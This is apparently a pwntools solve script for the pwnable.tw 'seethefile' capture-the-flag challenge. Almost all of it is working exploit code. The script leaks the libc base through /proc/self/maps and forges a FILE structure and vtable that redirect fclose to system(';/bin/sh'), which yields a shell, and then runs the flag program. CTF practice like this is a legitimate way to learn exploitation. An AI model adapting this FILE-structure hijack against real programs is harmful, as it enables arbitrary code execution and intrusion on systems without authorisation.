#!/usr/bin/env python3

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./seethefile_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

serv = "chall.pwnable.tw"
port = 10200

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            b writefile
            """)
    return r

r = conn()


def main():

    # Leak libc
    if args.REMOTE: 
        # Won't work locally because the binary file path is too large so leaking 0x18f bytes of /proc/self/maps won't leak till libc
        # However, remotely, the binary file path is just /home/seethefile/seethefile so we read far enough down /proc/self/maps to
        # reach the libc base addr
        sla(b'choice :', b'1')
        sla(b'see :', b'/proc/self/maps')
        sla(b'choice :', b'2') # First read doesn't reach the libc base addr
        sla(b'choice :', b'3')
        sla(b'choice :', b'2') # Second read leaks it
        sla(b'choice :', b'3')
        r.recvline()
        libc.address = int(r.recv(numb=8), 16)
        log.info(f"{hex(libc.address)=}")
    else:
        print("You must use GDB mode for local i.e. python3 solve.py GDB")
        user_str = input("Gimme libc base (in hex): ")
        libc.address = int(user_str, 16)


    ''' Example of the FILE struct in the heap
    0x92f2010:      0xfbad2488      0x092f22ff      0x092f2570      0x092f2170
    0x92f2020:      0x092f2170      0x092f2170      0x092f2170      0x092f2170
    0x92f2030:      0x092f2570      0x00000000      0x00000000      0x00000000
    0x92f2040:      0x00000000      0xf7fc2cc0      0x00000003      0x00000000
    '''

    # Craft forged FILE struct
    forged_FILE = b''.join([
        p32(0xfbad8488), # _flags, keep everything but turn off _IO_IS_FILEBUF, also turn on _IO_USER_LOCK so it doesn't try to acquire the lock
        b';/bin/sh\x00', # Our argument to /bin/sh
        b'A' * 0x39,
        b'\x01', # Ensures that _IO_vtable_offset is not 0 so that _IO_old_fclose is called instead _IO_new_fclose (so that the _IO_FILE struct is taken to be 0x4c instead of 0x94)
        b'A', # Padding
        b'A' * 0x4, # _IO_lock_t - doesn't matter since we turn on _IO_USER_LOCK, but otherwise just needs to point somewhere that is all 0's so that the lock can be acquired and released easily 
    ])
    forged_vtable = b''.join([
        p64(0), # JUMP_INIT_DUMMY,
        p32(libc.sym.system) # Overwrite _IO_file_finish
    ])
    payload = b''.join([
        forged_vtable.ljust(0x20, b'A'), # Use the space in `name` to store the forged vtable
        p32(0x804b284), # Pointer to our forged_FILE
        forged_FILE,
        p32(exe.sym.name), # vtable ptr
    ])

    # Exit and send payload
    sla(b'choice :', b'5')
    sla(b'name :', payload)

    # Get the flag
    snl(b'cd home/seethefile')
    snl(b'./get_flag')
    sla(b'magic :', b'Give me the flag')
    rcu(b'flag: ')
    log.info(rcl().decode())


if __name__ == "__main__":
    main()
